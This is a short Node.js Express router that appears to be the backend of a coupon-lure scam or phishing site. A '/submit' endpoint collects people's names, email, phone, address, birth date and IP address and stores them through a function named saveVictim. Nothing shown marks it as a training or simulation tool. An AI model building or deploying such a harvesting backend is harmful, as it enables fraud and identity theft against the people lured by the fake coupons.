const express = require('express');
const { getCoupons } = require('../services/couponService');
const { saveVictim } = require('../services/victimService');
const { validateVictimPayload } = require('../utils/validation');
const { submissionRateLimiter } = require('../middleware/rateLimiters');
const auditLogger = require('../middleware/auditLogger');

const router = express.Router();

router.get('/coupons', auditLogger('public:list-coupons'), async (_req, res, next) => {
  try {
    const coupons = await getCoupons();
    res.json({ coupons });
  } catch (error) {
    next(error);
  }
});

router.post(
  '/submit',
  submissionRateLimiter,
  auditLogger('public:submit-victim'),
  async (req, res, next) => {
    try {
      const payload = {
        sessionId: req.body.sessionId,
        firstName: req.body.firstName,
        lastName: req.body.lastName,
        email: req.body.email,
        phone: req.body.phone,
        address: req.body.address,
        birthDate: req.body.birthDate,
        couponId: req.body.couponId,
        ipAddress: req.ip,
      };
      validateVictimPayload(payload);
      await saveVictim(payload);
      res.status(201).json({ success: true });
    } catch (error) {
      if (error.status === 400) {
        res.status(400).json({ success: false, error: error.message });
        return;
      }
      next(error);
    }
  }
);

module.exports = router;
